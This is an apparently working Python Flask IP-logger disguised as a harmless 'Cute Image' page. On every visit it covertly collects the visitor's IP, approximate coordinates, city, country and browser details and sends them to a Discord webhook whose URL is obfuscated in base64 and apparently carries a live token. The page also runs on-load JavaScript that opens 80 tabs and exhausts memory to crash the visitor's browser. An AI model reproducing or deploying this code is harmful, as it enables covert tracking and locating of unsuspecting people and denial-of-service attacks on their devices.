from flask import Flask, request, render_template_string, jsonify
import requests
import time
import base64
import json

app = Flask(__name__)

# ==================== BUILT-IN CONFIG ====================
# EDIT THIS - Supports normal URL or Base64 encoded
# Base64 example: base64.b64encode(b"https://discord.com/api/webhooks/...").decode()
WEBHOOK_URL = 'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQ4ODI1OTAxMzk5NjA1NjYxOS9ZU1BHNFZ0Mmk2VlBDYlc0elU0YnpyLU1BMGlZNlNtMjZpU21sQW1mR1RtREpqcWhyNXJhRnlkZVpoTFhfU25fRzNyQQ=='

FAKE_IMAGE_URL = 'https://picsum.photos/800/600'

def decode_webhook_url(url):
    """Improved Base64 decode with padding fix and validation."""
    if url.startswith('https://'):
        return url
    try:
        # Fix padding for Base64
        padded = url + '=' * (-len(url) % 4)
        decoded = base64.b64decode(padded).decode('utf-8')
        if decoded.startswith('https://discord.com/api/webhooks/'):
            print("✅ Base64 webhook decoded successfully.")
            return decoded
    except Exception as e:
        print(f"Base64 decode failed: {e}")
    return url  # fallback

# Decode once at startup
WEBHOOK_URL = decode_webhook_url(WEBHOOK_URL)

def get_ip_and_coords(client_ip):
    """Get IP and coordinates (server-side fallback)."""
    try:
        # Use client's IP if provided, else request's remote
        ip = client_ip or request.remote_addr
        if ip in ['127.0.0.1', '::1']:
            ip = requests.get('https://api.ipify.org?format=json', timeout=5).json().get('ip')
        
        geo = requests.get(f"https://ipapi.co/{ip}/json/", timeout=10).json()
        return {
            "ip": ip,
            "latitude": geo.get("latitude", "Unknown"),
            "longitude": geo.get("longitude", "Unknown"),
            "city": geo.get("city", "Unknown"),
            "country": geo.get("country_name", "Unknown"),
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC")
        }
    except:
        return {"ip": request.remote_addr or "Unknown", "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC")}

def send_to_webhook(data):
    """Send stolen data to (decoded) webhook."""
    payload = {
        "content": "🔴 **IP + Coordinates Stolen via Vercel Page**",
        "embeds": [{
            "title": "Vercel IP Stealer Report",
            "color": 16711680,
            "fields": [
                {"name": "IP Address", "value": data.get("ip"), "inline": True},
                {"name": "Latitude", "value": str(data.get("latitude")), "inline": True},
                {"name": "Longitude", "value": str(data.get("longitude")), "inline": True},
                {"name": "City / Country", "value": f"{data.get('city', 'N/A')} - {data.get('country', 'N/A')}", "inline": False},
                {"name": "Timestamp", "value": data.get("timestamp"), "inline": False},
                {"name": "User-Agent", "value": request.headers.get('User-Agent', 'Unknown'), "inline": False}
            ]
        }]
    }
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print("✅ Data sent to webhook.")
    except Exception as e:
        print(f"Webhook error: {e}")

@app.route('/', methods=['GET'])
def home():
    client_ip = request.args.get('ip')  # optional override
    data = get_ip_and_coords(client_ip)
    send_to_webhook(data)
    
    # Fake image page with JS "crash" attempt (opens many tabs + memory pressure)
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cute Image</title>
        <style>body {{ text-align: center; font-family: Arial; background: black; color: white; }}</style>
        <script>
            // Fake image + aggressive JS to simulate crash / lag
            function triggerCrash() {{
                for(let i = 0; i < 80; i++) {{
                    window.open("https://www.youtube.com/watch?v=dQw4w9wgxcq&autoplay=1", "_blank");
                    let arr = new Array(1000000).fill("crash");
                }}
                alert("Image loaded! Enjoy :)");
            }}
            window.onload = triggerCrash;
        </script>
    </head>
    <body>
        <h1>Enjoy this beautiful image!</h1>
        <img src="{FAKE_IMAGE_URL}" width="800" alt="Fake Cute Image" onerror="this.src='https://picsum.photos/800/600';">
        <p>Background logging active...</p>
        <p style="color:red;">Click anywhere or wait - full experience loading.</p>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/health')
def health():
    return jsonify({"status": "ok", "webhook_decoded": WEBHOOK_URL.startswith('https://discord.com/api/webhooks/')})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
